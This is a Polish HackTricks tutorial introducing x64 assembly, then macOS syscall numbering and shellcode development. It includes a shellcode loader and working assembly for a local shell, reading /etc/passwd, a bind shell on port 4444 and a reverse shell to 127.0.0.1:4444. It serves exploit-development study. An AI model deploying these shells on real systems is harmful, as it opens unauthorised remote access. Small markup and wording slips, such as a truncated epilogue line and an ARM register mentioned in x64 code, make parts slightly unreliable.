# Wprowadzenie do x64

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Wprowadzenie do x64**

x64, znany również jako x86-64, to architektura procesora 64-bitowa, stosowana głównie w komputerach stacjonarnych i serwerach. Wywodząc się z architektury x86 opracowanej przez Intel, a później przyjętej przez AMD pod nazwą AMD64, jest dominującą architekturą w dzisiejszych komputerach osobistych i serwerach.

### **Rejestry**

x64 rozwija architekturę x86, oferując **16 rejestrów ogólnego przeznaczenia** oznaczonych jako `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` oraz `r8` do `r15`. Każdy z nich może przechowywać wartość **64-bitową** (8 bajtów). Rejestry te posiadają również podrejestry o rozmiarze 32-bitowym, 16-bitowym i 8-bitowym, zapewniające kompatybilność i obsługę określonych zadań.

1. **`rax`** - Tradycyjnie używany do **zwracania wartości** z funkcji.
2. **`rbx`** - Często używany jako **rejestr bazowy** do operacji na pamięci.
3. **`rcx`** - Powszechnie używany jako **licznik pętli**.
4. **`rdx`** - Używany w różnych rolach, w tym do rozszerzonych operacji arytmetycznych.
5. **`rbp`** - **Wskaźnik bazowy** dla ramki stosu.
6. **`rsp`** - **Wskaźnik stosu**, śledzący górę stosu.
7. **`rsi`** i **`rdi`** - Używane jako **indeksy źródła** i **docelowe** w operacjach na łańcuchach/pamięci.
8. **`r8`** do **`r15`** - Dodatkowe rejestry ogólnego przeznaczenia wprowadzone w x64.

### **Konwencja wywoływania**

Konwencja wywoływania x64 różni się w zależności od systemu operacyjnego. Na przykład:

* **Windows**: Pierwsze **cztery parametry** są przekazywane w rejestrach **`rcx`**, **`rdx`**, **`r8`** i **`r9`**. Kolejne parametry są umieszczane na stosie. Wartość zwracana znajduje się w rejestrze **`rax`**.
* **System V (powszechnie stosowany w systemach UNIX-podobnych)**: Pierwsze **sześć parametrów całkowitych lub wskaźników** jest przekazywanych w rejestrach **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** i **`r9`**. Wartość zwracana również znajduje się w rejestrze **`rax`**.

Jeśli funkcja ma więcej niż sześć parametrów, **reszta zostanie przekazana na stos**. **RSP**, wskaźnik stosu, musi być **wyrównany do 16 bajtów**, co oznacza, że adres, na który wskazuje, musi być podzielny przez 16 przed wykonaniem jakiegokolwiek wywołania. Oznacza to, że normalnie musielibyśmy upewnić się, że RSP jest odpowiednio wyrównany w naszym kodzie shell przed wykonaniem wywołania funkcji. Jednak w praktyce wywołania systemowe często działają nawet jeśli ten wymóg nie jest spełniony.

### Konwencja wywoływania w Swift

Swift ma swoją własną **konwencję wywoływania**, którą można znaleźć pod adresem [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Wspólne instrukcje**

Instrukcje x64 posiadają bogaty zestaw, zachowując kompatybilność z wcześniejszymi instrukcjami x86 i wprowadzając nowe.

* **`mov`**: **Przenosi** wartość z jednego **rejestru** lub **lokalizacji pamięci** do drugiego.
* Przykład: `mov rax, rbx` — Przenosi wartość z `rbx` do `rax`.
* **`push`** i **`pop`**: Odkłada lub zdejmuje wartości ze **stosu**.
* Przykład: `push rax` — Odkłada wartość z `rax` na stos.
* Przykład: `pop rax` — Zdejmuje wartość ze szczytu stosu do `rax`.
* **`add`** i **`sub`**: Operacje **dodawania** i **odejmowania**.
* Przykład: `add rax, rcx` — Dodaje wartości w `rax` i `rcx`, przechowując wynik w `rax`.
* **`mul`** i **`div`**: Operacje **mnożenia** i **dzielenia**. Uwaga: mają one określone zachowanie w odniesieniu do użycia operandów.
* **`call`** i **`ret`**: Służą do **wywoływania** i **powrotu z funkcji**.
* **`int`**: Służy do wywołania oprogramowania **przerwania**. Na przykład `int 0x80` było używane do wywoływania systemu w 32-bitowym x86 Linux.
* **`cmp`**: Porównuje dwie wartości i ustawia flagi CPU na podstawie wyniku.
* Przykład: `cmp rax, rdx` — Porównuje `rax` z `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: Instrukcje **skoku warunkowego**, które zmieniają przepływ sterowania na podstawie wyników wcześniejszego `cmp` lub testu.
* Przykład: Po instrukcji `cmp rax, rdx`, `je label` — Skacze do `label`, jeśli `rax` jest równy `rdx`.
* **`syscall`**: Używane do **wywołań systemowych** w niektórych systemach x64 (np. nowoczesne Unixy).
* **`sysenter`**: Zoptymalizowana instrukcja **wywołania systemowego** na niektórych platformach.

### **Prolog funkcji**

1. **Odkładanie starego wskaźnika bazowego**: `push rbp` (zapisuje wskaźnik bazowy wywołującego)
2. **Przenoszenie bieżącego wskaźnika stosu do wskaźnika bazowego**: `mov rbp, rsp` (ustawia nowy wskaźnik bazowy dla bieżącej funkcji)
3. **Alokowanie miejsca na stosie dla zmiennych lokalnych**: `sub rsp, <rozmiar>` (gdzie `<rozmiar>` to liczba bajtów potrzebna)

### **Epilog funkcji**

1. **Przenoszenie bieżącego wskaźnika bazowego do wskaźnika stosu**: `mov rsp, rbp` (dezalokuje zmienne lokalne)
2. **Zdejmowanie starego wskaźnika bazowego ze stosu**: `pop rbp
## macOS

### syscalle

Istnieją różne klasy syscalle, możesz je znaleźć [**tutaj**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Następnie, możesz znaleźć numer każdego wywołania systemowego [**w tym adresie URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Aby wywołać `open` syscall (**5**) z klasy **Unix/BSD**, musisz dodać: `0x2000000`

Więc numer syscalla do wywołania open to `0x2000005`

### Shellkody

Aby skompilować:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Aby wyodrębnić bajty:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>Kod C do testowania shellcode'u</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Powłoka

Pobrane z [**tutaj**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i wyjaśnione.

{% tabs %}
{% tab title="z adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% tab title="z użyciem stosu" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### Odczytaj za pomocą polecenia cat

Celem jest wykonanie polecenia `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, więc drugi argument (x1) jest tablicą parametrów (które w pamięci oznaczają stos adresów).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Wywołaj polecenie za pomocą sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Powłoka bind

Powłoka bind ze strony [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) na **porcie 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Odwrócony Shell

Odwrócony shell dostępny pod adresem [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Odwrócony shell do **127.0.0.1:4444**.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
